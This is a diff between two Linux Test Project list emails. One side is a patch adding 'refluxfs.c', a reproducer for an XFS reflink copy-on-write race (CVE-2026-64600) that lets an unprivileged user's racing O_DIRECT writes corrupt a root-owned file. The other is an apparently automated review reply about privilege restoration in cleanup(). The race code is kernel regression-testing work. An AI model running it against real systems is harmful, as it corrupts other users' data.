@@ -4,114 +4,82 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 7ED73C531F9
-	for <ltp@archiver.kernel.org>; Fri, 24 Jul 2026 12:54:48 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id E6337C53200
+	for <ltp@archiver.kernel.org>; Fri, 24 Jul 2026 17:56:46 +0000 (UTC)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id AB3A93E72AB
-	for <ltp@archiver.kernel.org>; Fri, 24 Jul 2026 14:54:46 +0200 (CEST)
-Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it
- [IPv6:2001:4b78:1:20::3])
+	by picard.linux.it (Postfix) with ESMTP id 047783E72A3
+	for <ltp@archiver.kernel.org>; Fri, 24 Jul 2026 19:56:45 +0200 (CEST)
+Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
+ [IPv6:2001:4b78:1:20::2])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
- key-exchange X25519 server-signature ECDSA (secp384r1))
+ key-exchange X25519 server-signature ECDSA (secp384r1) server-digest SHA384)
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id D8BD13E1C7D
- for <ltp@lists.linux.it>; Fri, 24 Jul 2026 14:54:29 +0200 (CEST)
-Received: from smtp-out2.suse.de (smtp-out2.suse.de
- [IPv6:2a07:de40:b251:101:10:150:64:2])
- (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+ by picard.linux.it (Postfix) with ESMTPS id BC4543E1C8A
+ for <ltp@lists.linux.it>; Fri, 24 Jul 2026 19:56:28 +0200 (CEST)
+Received: from mail-qk2-x03.google.com (mail-qk2-x03.google.com
+ [IPv6:2607:f8b0:4864:34::3])
+ (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-3.smtp.seeweb.it (Postfix) with ESMTPS id E95381A00276
- for <ltp@lists.linux.it>; Fri, 24 Jul 2026 14:54:27 +0200 (CEST)
-Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
- [IPv6:2a07:de40:b281:104:10:150:64:97])
- (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
- key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
- (No client certificate requested)
- by smtp-out2.suse.de (Postfix) with ESMTPS id 21A5D4001;
- Fri, 24 Jul 2026 12:54:25 +0000 (UTC)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
- t=1784897665; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
- mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding;
- bh=AyXWdzE+3+ch9Ilij4P2W8elUJ7JmmdoA90UrblOvTU=;
- b=I7DurLPu44KEE1qBEYfg5U2Nw7sdlFHeWs+0MMLGTI0QqO567TXWX2fgQXnnNFLfTocCFy
- O03x2xrFcM3SNKYhfRWYIneJ5JAD7ngkntS/WmHPVT+aSBHuVBM8PFhzSHG951Bjsr/SYv
- xnaZAm/wqtq6H4KITf4yUmAOrAvPVX0=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
- s=susede2_ed25519; t=1784897665;
- h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
- mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding;
- bh=AyXWdzE+3+ch9Ilij4P2W8elUJ7JmmdoA90UrblOvTU=;
- b=hAwJk23Vafwe2CXeQaebXCECDqKOX6+MAKZpEKuU81rIoiybwhaglHQur1e/PoDW1WN9TP
- RMHlB4YHD6aZAeBA==
-Authentication-Results: smtp-out2.suse.de;
- dkim=pass header.d=suse.de header.s=susede2_rsa header.b=I7DurLPu;
- dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=hAwJk23V
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
- t=1784897665; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
- mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding;
- bh=AyXWdzE+3+ch9Ilij4P2W8elUJ7JmmdoA90UrblOvTU=;
- b=I7DurLPu44KEE1qBEYfg5U2Nw7sdlFHeWs+0MMLGTI0QqO567TXWX2fgQXnnNFLfTocCFy
- O03x2xrFcM3SNKYhfRWYIneJ5JAD7ngkntS/WmHPVT+aSBHuVBM8PFhzSHG951Bjsr/SYv
- xnaZAm/wqtq6H4KITf4yUmAOrAvPVX0=
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
- s=susede2_ed25519; t=1784897665;
- h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
- mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding;
- bh=AyXWdzE+3+ch9Ilij4P2W8elUJ7JmmdoA90UrblOvTU=;
- b=hAwJk23Vafwe2CXeQaebXCECDqKOX6+MAKZpEKuU81rIoiybwhaglHQur1e/PoDW1WN9TP
- RMHlB4YHD6aZAeBA==
-Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
- (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
- key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
- (No client certificate requested)
- by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id EC8DB779BA;
- Fri, 24 Jul 2026 12:54:24 +0000 (UTC)
-Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
- by imap1.dmz-prg2.suse.org with ESMTPSA id zxkfN4BgY2q6fgAAD6G6ig
- (envelope-from <andrea.cervesato@suse.de>); Fri, 24 Jul 2026 12:54:24 +0000
-From: Andrea Cervesato <andrea.cervesato@suse.de>
-Date: Fri, 24 Jul 2026 14:54:24 +0200
+ by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 095E360042C
+ for <ltp@lists.linux.it>; Fri, 24 Jul 2026 19:56:28 +0200 (CEST)
+Received: by mail-qk2-x03.google.com with SMTP id
+ d75a77b69052e-51bfca7f85aso4738751cf.0
+ for <ltp@lists.linux.it>; Fri, 24 Jul 2026 10:56:27 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=gmail.com; s=20251104; t=1784915787; x=1785520587; darn=lists.linux.it;
+ h=content-transfer-encoding:mime-version:references:in-reply-to
+ :message-id:date:subject:cc:to:from:from:to:cc:subject:date
+ :message-id:reply-to:content-type;
+ bh=TBxqd2Pft1aqJXwZEJLTo373fE6s8oGyRFibg7CS7vo=;
+ b=iAd8rTynez6vvlAFZCws/z2E4N2N14spY3MFED1JG0v3pnLf/L2gz+ETSO40xG0lkA
+ RQEvsRcnsxbCOOofZDCOrs2Bs8ezhMqNdySGHceK5NiBsbYBtRDolXutdDePoXydEekf
+ 2DJMdZlpJL5VaFdVJVKh1BcqQ5EErXi9u+aCoynL2Hd/hAdN9CYnzhQBSyTGQxKCTQA1
+ QQ02O7aOBrAtVdz0DqjToNJuPi3rdeZ7CcR7Cm4Hgh+1f6tRjNOBtjkEn4X3OVwfCewf
+ pQ4hPH+Hvk79e8uy3up9/JEM4MJgdRsVjpaZT7S09XpSa4hIpGnhGF9FmSyIrJUM1itc
+ sL5g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=1e100.net; s=20251104; t=1784915787; x=1785520587;
+ h=content-transfer-encoding:mime-version:references:in-reply-to
+ :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+ :to:cc:subject:date:message-id:reply-to:content-type;
+ bh=TBxqd2Pft1aqJXwZEJLTo373fE6s8oGyRFibg7CS7vo=;
+ b=JJEsGX0phHGmT9EZ43QaKSbLExyBwdDIsLVWj5laT6sgNcyfmooc43vTCdcc7oUntk
+ M6nubndUtmWoQhuoVJH0k6VtDEyLodzvkj6aKUxqm2Id0Kf1ymW/7ShEk0kxHmfvYDLB
+ E8XNc0/unrzcVWC2mM+Zvo1rDo8NElM7zY+dJVrP+4HyLtPZSNOZp6AvIeY1hnpQlWRY
+ qQRF9bTtvqce0WAr5r5kcyyZF4hyFMt2M7xgqqe1sj1W8qvpipsRyXr341j9Rh/xR4ce
+ bs4IL0hLW8vRIfEktZnUTYdDZwtBO5QdHzD4MFEO6qv6orwJcM9v7cPPP1D+nDYw7ePu
+ DWGQ==
+X-Gm-Message-State: AOJu0YwkJG5t6cMa6miDluGdYR2l8FV/dU87ZGhmfWh/UGNGdttDLEbV
+ I5Wpb+2TF8ZHkByjHR8si7wyUKwUqGy+vlQffbhSY4Mm/pDom2xqjrW/
+X-Gm-Gg: AR+sD13LhbZmseeNdZa2vIZhSsArtQzIwBkkqiCyyGOOV8V4JCBu5IvtqC8g53cdnPl
+ XqvDv96jSazjpG1WIC5cw9tviu+vjQQNAFAcx8NAxP/mz4XZnTLQW5cLnJEiT8uXH5NTElRHEXa
+ kMv0l1UMmoGegVWMbIiHH3rf9At4U6FGHaNye7M25kzLXGYn1aVCB1gGYTqGre3jLxs9lH7i0Ao
+ SsIF3cjO7AJGHQb+U4gAMrgmOWpPZPyZ9teuAfq1PGIMRyAE0rMfnS8mf9wkmMvfKSFfqSHeoS3
+ nbWBHu6Ds4qQoFLuiYdYbxAX9V+7Uk5N+NsR3r6KAlFYw34wK0LvLvA+CfVObXZGXoU7SIe0DeP
+ D0cSkrBvJk0sjUL2UJRHQnGOFWDDmWdcPJNaV37K80kR2bdc1w/qEpKIga8wNSDqJ1phT6zMSA0
+ +pS7esscLdnCnI8ojwL7O3UZzd0nhIVtqh7FWoKccgXymOANPEw4JeFmt/+dhh4qOQER23CLmDp
+ JxXLfMi34jAVS3ruA==
+X-Received: by 2002:a05:622a:4c06:b0:51c:63d:fc10 with SMTP id
+ d75a77b69052e-5283de34e9bmr78576681cf.25.1784915786651; 
+ Fri, 24 Jul 2026 10:56:26 -0700 (PDT)
+Received: from
+ runnervmvrwv9.yo2jsnv3aaiufmiidgoerdg2xa.bx.internal.cloudapp.net
+ ([172.174.165.6]) by smtp.gmail.com with ESMTPSA id
+ 6a1803df08f44-907e854e43csm3336876d6.16.2026.07.24.10.56.25
+ (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+ Fri, 24 Jul 2026 10:56:25 -0700 (PDT)
+From: linuxtestproject.agent@gmail.com
+To: Andrea Cervesato <andrea.cervesato@suse.de>
+Date: Fri, 24 Jul 2026 17:56:24 +0000
+Message-ID: <20260724175624.8856-1-linuxtestproject.agent@gmail.com>
+X-Mailer: git-send-email 2.54.0
+In-Reply-To: <20260724-cve-2026-64600-v2-1-c039960448f6@suse.com>
+References: <20260724-cve-2026-64600-v2-1-c039960448f6@suse.com>
 MIME-Version: 1.0
-Message-Id: <20260724-cve-2026-64600-v2-1-c039960448f6@suse.com>
-X-B4-Tracking: v=1; b=H4sIAH9gY2oC/3XMQQ7CIBCF4as0s3YMDJQ2rryH6aKBwbKwGFCia
- bi7tHuX30vev0HmFDjDpdsgcQk5xLWBTh3YZV7vjME1AwkyYiCNtjDuQKONENgr74wzNDijoJ2
- eiX34HMHb1LyE/Irpe/SL3Ne/qSJR4uhnklqNvSO+5nfms40PmGqtPwN75GqrAAAA
-X-Change-ID: 20260724-cve-2026-64600-53fd6d627d63
-To: Linux Test Project <ltp@lists.linux.it>
-X-Mailer: b4 0.14.2
-X-Developer-Signature: v=1; a=ed25519-sha256; t=1784897664; l=11860;
- i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
- bh=vsvBXbzOKeeh3ZEEU+/ZVMUconP7cgjNtG13jQoz1FE=;
- b=nzshn9p61V9o/VCgt2x7w0uzYWE43L74legGiS9ZsAEXyKVTzZdge/McW0vyWHN88aXFzjXjY
- G4YP5U2ndL4AfiTczpdE5Pcy2ymjUBE6oUDbbzGLFTlGbeCfTto1ZPL
-X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
- pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
-X-Rspamd-Action: no action
-X-Rspamd-Queue-Id: 21A5D4001
-X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
- NEURAL_HAM_LONG(-1.00)[-1.000];
- R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
- NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
- MX_GOOD(-0.01)[];
- DNSWL_BLOCKED(0.00)[2a07:de40:b281:104:10:150:64:97:from];
- RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
- FUZZY_RATELIMITED(0.00)[rspamd.com]; MIME_TRACE(0.00)[0:+];
- RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
- TO_DN_ALL(0.00)[]; FROM_EQ_ENVFROM(0.00)[];
- FROM_HAS_DN(0.00)[];
- DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
- RCVD_COUNT_TWO(0.00)[2]; TO_MATCH_ENVRCPT_ALL(0.00)[];
- DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,suse.de:dkim,suse.com:email,suse.com:mid];
- DKIM_TRACE(0.00)[suse.de:+]
-X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
-X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
+X-Virus-Scanned: clamav-milter 1.0.9 at in-2.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: [LTP] [PATCH v2] cve: reproducer for cve-2026-64600
+Subject: Re: [LTP] cve: reproducer for cve-2026-64600
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -123,398 +91,65 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
+Cc: ltp@lists.linux.it
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
-From: Andrea Cervesato <andrea.cervesato@suse.com>
+Hi Andrea,
 
-Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
-reflink copy-on-write path for direct I/O writes. The bug was introduced
-in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
-blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
-the data fork mapping after cycling ILOCK").
+On 2026-07-24, Andrea Cervesato wrote:
+> cve: reproducer for cve-2026-64600
 
-Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
----
-This reproducer has been created with the usage of Kimi K3 (as analyzer
-and writer) and DeepSeek v4 Flash (Max) as reviewer, by taking the
-RefluXFS technical paper as input:
-https://cdn2.qualys.com/advisory/2026/07/22/RefluXFS.txt
+> +static void cleanup(void)
+> +{
+> +	stop_pressure_threads();
+> +
+> +	if (barrier_initialized)
+> +		SAFE_PTHREAD_BARRIER_DESTROY(&barrier);
+> +
+> +	if (target_dio_fd != -1)
+> +		SAFE_CLOSE(target_dio_fd);
+> +
+> +	if (target_fd != -1)
+> +		SAFE_CLOSE(target_fd);
+> +
+> +	if (clone_fd != -1)
+> +		SAFE_CLOSE(clone_fd);
+> +
+> +	free(tbuf);
+> +	free(wbuf);
+> +	free(rbuf);
+> +}
 
-On bugged kernel:
+The header comment says "Root privilege is regained in cleanup() so
+the library can unmount the loop device", but cleanup() never calls
+SAFE_SETEUID(0)/SAFE_SETEGID(0). setup() drops to "nobody" via
+drop_privileges() and nothing restores euid/egid afterwards.
 
-tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
-tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #21 SMP PREEMPT_DYNAMIC Fri Jul 24 10:20:05 CEST 2026 x86_64
-tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
-tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
-cve-2026-64600.c:233: TFAIL: round 0: racing O_DIRECT write to the clone succeeded
-[    1.252815] cve-2026-646
-HINT: You _MAY_ be missing kernel fixes:
+Other tests that drop privileges the same way restore them in
+cleanup(), e.g. chmod06.c, acct01.c, creat06.c all call
+SAFE_SETEUID(0) there. Per capabilities(7), effective capabilities are
+cleared once euid moves away from 0, so the process is still
+unprivileged when cleanup() returns. The library's subsequent unmount
+of the loop device would then fail with EPERM, leaving the mount and
+loop device attached.
 
-https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2f4acd0fcd86
+Is a SAFE_SETEUID(0) (and SAFE_SETEGID(0)) call missing at the start
+of cleanup()?
 
-HINT: You _MAY_ be vulnerable to CVE(s):
-
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-64600
-
-Summary:
-passed   0
-failed   1
-broken   0
-skipped  0
-warnings 0
-
-On patched kernel:
-
-tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
-tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #20 SMP PREEMPT_DYNAMIC Fri Jul 24 10:08:53 CEST 2026 x86_64
-tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
-tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
-[    1.665909] clocksource: Watchdog remote CPU 2 read timed out
-[    8.099229] cve-2026-64600 (249) used greatest stack depth: 12216 bytes left
-cve-2026-64600.c:242: TPASS: Source file survived racing O_DIRECT writers
-
-Summary:
-passed   1
-failed   0
-broken   0
-skipped  0
-warnings 0
----
-Changes in v2:
-- rename refluxfs.c
-- ensure reflink=1 for mkfs.xfs
-- remove root restore
-- Link to v1: https://lore.kernel.org/20260724-cve-2026-64600-v1-1-8fa214385d2e@suse.com
----
- runtest/cve              |   1 +
- testcases/cve/.gitignore |   1 +
- testcases/cve/Makefile   |   2 +-
- testcases/cve/refluxfs.c | 274 +++++++++++++++++++++++++++++++++++++++++++++++
- 4 files changed, 277 insertions(+), 1 deletion(-)
-
-diff --git a/runtest/cve b/runtest/cve
-index 3bbcfd6a2f2fb204fc6ae4ba89b5a7554c2fcbc5..d1b855d61af3c7fd046ce3c748a151346d679350 100644
---- a/runtest/cve
-+++ b/runtest/cve
-@@ -100,3 +100,4 @@ cve-2026-43494 io_uring04
- cve-2026-46300 xfrm02
- cve-2026-46300-skb-segment xfrm03
- cve-2026-46331 cve-2026-46331
-+cve-2026-64600 refluxfs
-diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
-index bc1af0dd2c8086e4f5f78a3b15b91fafbd8f5936..5aa038cd5871424967035b39bd3945a038ad13b8 100644
---- a/testcases/cve/.gitignore
-+++ b/testcases/cve/.gitignore
-@@ -16,3 +16,4 @@ tcindex01
- cve-2025-38236
- cve-2025-21756
- cve-2026-46331
-+refluxfs
-diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
-index 98c38e90801a21eedad986273d537b16f3e4eb91..6be4999a3ea256cf48520c877400dfca19461177 100644
---- a/testcases/cve/Makefile
-+++ b/testcases/cve/Makefile
-@@ -11,7 +11,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
- 
- cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
- 
--cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053:  CFLAGS += -pthread
-+cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 refluxfs:  CFLAGS += -pthread
- cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
- 
- ifneq ($(ANDROID),1)
-diff --git a/testcases/cve/refluxfs.c b/testcases/cve/refluxfs.c
-new file mode 100644
-index 0000000000000000000000000000000000000000..bfb85bfb0a49d524b74646040ae3ce7b7d05f5ab
---- /dev/null
-+++ b/testcases/cve/refluxfs.c
-@@ -0,0 +1,274 @@
-+// SPDX-License-Identifier: GPL-2.0-or-later
-+/*
-+ * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
-+ */
-+
-+/*\
-+ * Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
-+ * reflink copy-on-write path for direct I/O writes. The bug was introduced
-+ * in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
-+ * blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
-+ * the data fork mapping after cycling ILOCK").
-+ *
-+ * When an :manpage:`ioctl(2)` FICLONE clone is written via ``O_DIRECT``,
-+ * ``xfs_direct_write_iomap_begin()`` samples the clone's data-fork mapping
-+ * under ILOCK and calls ``xfs_reflink_allocate_cow()``, which drops the
-+ * ILOCK to allocate a transaction and then re-checks whether the *stale*
-+ * physical block is still shared. If a second racing ``O_DIRECT`` writer
-+ * completes a full copy-on-write cycle inside that lock-drop window, the
-+ * old shared block's refcount drops to one, the first writer takes the
-+ * "not shared, write in place" branch, and its write is submitted to the
-+ * physical block that now belongs only to the reflink source file,
-+ * corrupting it on disk.
-+ *
-+ * [Algorithm]
-+ *
-+ * - Create a root-owned target file on a reflink-enabled XFS and fill
-+ *   its first block with a known pattern
-+ * - Drop privileges to the unprivileged user ``nobody``
-+ * - Positive control: a single ``O_DIRECT`` write to a fresh clone must
-+ *   be copy-on-written and leave the target untouched
-+ * - Each round: reflink-clone the target into a scratch clone file and
-+ *   release a barrier of threads, each issuing one block-sized
-+ *   ``O_DIRECT`` :manpage:`pwrite(2)` at offset 0 of the clone
-+ * - Background threads loop on write/fdatasync/truncate cycles to stall
-+ *   transaction allocation on log space and widen the lock-drop window
-+ * - After each round, read back the target's first block bypassing the
-+ *   page cache (``O_DIRECT``): any byte differing from the original
-+ *   pattern means a racing write refluxed into the source file and the
-+ *   kernel is vulnerable
-+ *
-+ * Root privilege is regained in cleanup() so the library can unmount
-+ * the loop device.
-+ */
-+
-+#include <pwd.h>
-+
-+#include "tst_test.h"
-+#include "tst_safe_pthread.h"
-+#include "tst_safe_prw.h"
-+#include "lapi/ficlone.h"
-+
-+#define MNTPOINT	"mnt"
-+#define WORKDIR		MNTPOINT "/work"
-+#define TARGET		WORKDIR "/target"
-+#define CLONE		WORKDIR "/clone"
-+#define SCRATCH_FMT	WORKDIR "/scratch%d"
-+
-+#define BLKSIZE		4096
-+#define NWRITERS	32
-+#define NPRESSURE	16
-+#define MAX_ROUNDS	5000
-+
-+static char *tbuf, *wbuf, *rbuf;
-+
-+static int target_fd = -1;
-+static int target_dio_fd = -1;
-+static int clone_fd = -1;
-+
-+static pthread_t writers[NWRITERS];
-+static pthread_t pressure_threads[NPRESSURE];
-+static pthread_barrier_t barrier;
-+static int barrier_initialized;
-+static volatile sig_atomic_t stop_pressure;
-+static int pressure_running;
-+
-+static void *writer_fn(void *arg)
-+{
-+	int fd;
-+
-+	(void)arg;
-+
-+	fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
-+
-+	SAFE_PTHREAD_BARRIER_WAIT(&barrier);
-+
-+	SAFE_PWRITE(1, fd, wbuf, BLKSIZE, 0);
-+	SAFE_CLOSE(fd);
-+
-+	return NULL;
-+}
-+
-+static void *pressure_fn(void *arg)
-+{
-+	char path[PATH_MAX];
-+	int fd;
-+
-+	snprintf(path, sizeof(path), SCRATCH_FMT, (int)(long)arg);
-+
-+	fd = SAFE_OPEN(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
-+
-+	while (!stop_pressure) {
-+		SAFE_PWRITE(1, fd, wbuf, BLKSIZE, 0);
-+		SAFE_FTRUNCATE(fd, 0);
-+		SAFE_FSYNC(fd);
-+	}
-+
-+	SAFE_CLOSE(fd);
-+
-+	return NULL;
-+}
-+
-+static void stop_pressure_threads(void)
-+{
-+	if (!pressure_running)
-+		return;
-+
-+	stop_pressure = 1;
-+
-+	for (int i = 0; i < NPRESSURE; i++)
-+		SAFE_PTHREAD_JOIN(pressure_threads[i], NULL);
-+
-+	pressure_running = 0;
-+}
-+
-+static void drop_privileges(void)
-+{
-+	struct passwd *pw;
-+
-+	pw = SAFE_GETPWNAM("nobody");
-+	SAFE_SETEGID(pw->pw_gid);
-+	SAFE_SETEUID(pw->pw_uid);
-+}
-+
-+static void setup(void)
-+{
-+	int probe_fd, probe_dio_fd;
-+
-+	tbuf = SAFE_MEMALIGN(BLKSIZE, BLKSIZE);
-+	wbuf = SAFE_MEMALIGN(BLKSIZE, BLKSIZE);
-+	rbuf = SAFE_MEMALIGN(BLKSIZE, BLKSIZE);
-+
-+	memset(tbuf, 'A', BLKSIZE);
-+	memset(wbuf, 'X', BLKSIZE);
-+	memset(rbuf, 0, BLKSIZE);
-+
-+	SAFE_MKDIR(WORKDIR, 0700);
-+	SAFE_CHMOD(WORKDIR, 0777);
-+
-+	target_fd = SAFE_OPEN(TARGET, O_RDWR | O_CREAT | O_TRUNC, 0644);
-+	SAFE_WRITE(1, target_fd, tbuf, BLKSIZE);
-+	SAFE_FSYNC(target_fd);
-+	SAFE_CLOSE(target_fd);
-+
-+	drop_privileges();
-+
-+	target_fd = SAFE_OPEN(TARGET, O_RDONLY);
-+	probe_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
-+
-+	TEST(ioctl(probe_fd, FICLONE, target_fd));
-+	if (TST_RET == -1) {
-+		if (TST_ERR == EOPNOTSUPP || TST_ERR == EINVAL || TST_ERR == ENOSYS) {
-+			tst_brk(TCONF, "reflink clones not supported: %s",
-+				tst_strerrno(TST_ERR));
-+		}
-+
-+		tst_brk(TBROK | TTERRNO, "ioctl(FICLONE) failed");
-+	}
-+
-+	probe_dio_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
-+	SAFE_PWRITE(1, probe_dio_fd, wbuf, BLKSIZE, 0);
-+	SAFE_CLOSE(probe_dio_fd);
-+	SAFE_CLOSE(probe_fd);
-+
-+	/* The racy write bypasses the target's page cache, so must the read */
-+	target_dio_fd = SAFE_OPEN(TARGET, O_RDONLY | O_DIRECT);
-+
-+	SAFE_PREAD(1, target_dio_fd, rbuf, BLKSIZE, 0);
-+	if (memcmp(rbuf, tbuf, BLKSIZE))
-+		tst_brk(TBROK, "Source file modified by a single O_DIRECT write to the clone");
-+
-+	SAFE_PTHREAD_BARRIER_INIT(&barrier, NULL, NWRITERS + 1);
-+	barrier_initialized = 1;
-+}
-+
-+static void run(void)
-+{
-+	int i, round, corrupted = 0;
-+
-+	stop_pressure = 0;
-+
-+	for (i = 0; i < NPRESSURE; i++)
-+		SAFE_PTHREAD_CREATE(&pressure_threads[i], NULL, pressure_fn,
-+				    (void *)(long)i);
-+	pressure_running = 1;
-+
-+	for (round = 0; round < MAX_ROUNDS; round++) {
-+		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
-+
-+		/*
-+		 * target_fd is O_RDONLY opened as "nobody".  FICLONE
-+		 * checks inode permission against our effective UID.
-+		 */
-+		SAFE_IOCTL(clone_fd, FICLONE, target_fd);
-+		SAFE_CLOSE(clone_fd);
-+
-+		for (i = 0; i < NWRITERS; i++)
-+			SAFE_PTHREAD_CREATE(&writers[i], NULL, writer_fn, NULL);
-+
-+		SAFE_PTHREAD_BARRIER_WAIT(&barrier);
-+
-+		for (i = 0; i < NWRITERS; i++)
-+			SAFE_PTHREAD_JOIN(writers[i], NULL);
-+
-+		SAFE_PREAD(1, target_dio_fd, rbuf, BLKSIZE, 0);
-+
-+		if (memcmp(rbuf, tbuf, BLKSIZE)) {
-+			tst_res(TFAIL, "round %d: racing O_DIRECT write to the clone succeeded", round);
-+			corrupted = 1;
-+			break;
-+		}
-+	}
-+
-+	stop_pressure_threads();
-+
-+	if (!corrupted)
-+		tst_res(TPASS, "Source file survived racing O_DIRECT writers");
-+}
-+
-+static void cleanup(void)
-+{
-+	stop_pressure_threads();
-+
-+	if (barrier_initialized)
-+		SAFE_PTHREAD_BARRIER_DESTROY(&barrier);
-+
-+	if (target_dio_fd != -1)
-+		SAFE_CLOSE(target_dio_fd);
-+
-+	if (target_fd != -1)
-+		SAFE_CLOSE(target_fd);
-+
-+	if (clone_fd != -1)
-+		SAFE_CLOSE(clone_fd);
-+
-+	free(tbuf);
-+	free(wbuf);
-+	free(rbuf);
-+}
-+
-+static struct tst_test test = {
-+	.test_all = run,
-+	.setup = setup,
-+	.cleanup = cleanup,
-+	.needs_root = 1,
-+	.mount_device = 1,
-+	.mntpoint = MNTPOINT,
-+	.filesystems = (struct tst_fs []) {
-+		{
-+			.type = "xfs",
-+			.min_kver = "4.16",
-+			.mkfs_ver = "mkfs.xfs >= 1.5.0",
-+			.mkfs_opts = (const char *const []) {
-+				"-m", "reflink=1",
-+				NULL
-+			},
